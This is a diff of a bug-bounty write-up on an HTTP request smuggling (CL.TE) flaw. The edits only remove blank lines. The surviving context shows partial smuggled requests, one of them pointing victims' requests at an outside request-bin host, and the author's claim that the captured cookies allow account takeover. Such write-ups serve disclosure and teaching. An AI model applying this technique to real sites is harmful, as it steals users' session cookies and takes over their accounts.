@@ -48,8 +48,6 @@ It is a CT.TE Here, the front-end server uses the `Content-Length` header and th
 
 I started now to validate if the vulnerability exits of its just a false positive. I send the following request:
 
-‌
-
 ```
 POST / HTTP/1.1 
 Host: subdoamin.readcted.com
@@ -70,7 +68,6 @@ which successfully triggers a connection time out indicating the backend server 
 
 To exploit HTTP Request Smuggling Vulnerability you have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:
 
-‌
 ```
 POST / HTTP/1.1
 Host: redacted.com
@@ -122,7 +119,6 @@ GET /video HTTP/1.1
 Host: enfliy4kmrr8i.x.pipedream.net
 Foo: x
 ```
-
 and then pass our request to turbo intruder and start our attack:
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMqTVoY0h_myvBGJ3h%2F-MiN12rU2wKYeV-0YdJu%2F1-turbo-intruder-redacted.png?alt=media&token=2cc95312-90cc-49ad-aee0-9016c56a0f11)
@@ -132,7 +128,6 @@ Okay, the attack worked now let's back to or endpoint to see what's happen.
 ![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMqTVoY0h_myvBGJ3h%2F-MiN2Uly_EoUyexj4Omh%2F3-Request%20bin%20--%20with%20Cookie-redacted.png?alt=media&token=2b599ba5-3516-45b1-914b-341164a2c1fc)
 
 **BOOM!!** My endpoint is flooding with requests that contains cookie. Now, I can fully takeover any account who is browsing the website.
-
 
 ## **Conclusion**
 
